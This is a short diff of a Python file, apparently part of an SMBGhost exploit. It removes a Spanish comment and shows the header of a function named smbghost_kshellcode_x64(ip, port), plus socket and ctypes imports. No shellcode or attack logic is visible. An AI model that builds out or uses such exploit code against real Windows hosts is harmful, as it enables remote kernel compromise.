@@ -1,7 +1,6 @@
 import socket, struct, sys
 import os, ctypes, threading
 
-#NO ES NECESARIO EXPLICAR COMO LO HICIMOS PARA OBTENER ESTO, SOLO QUE ES.
 ###################################################################################################################################################################################
 
 def smbghost_kshellcode_x64(ip, port):
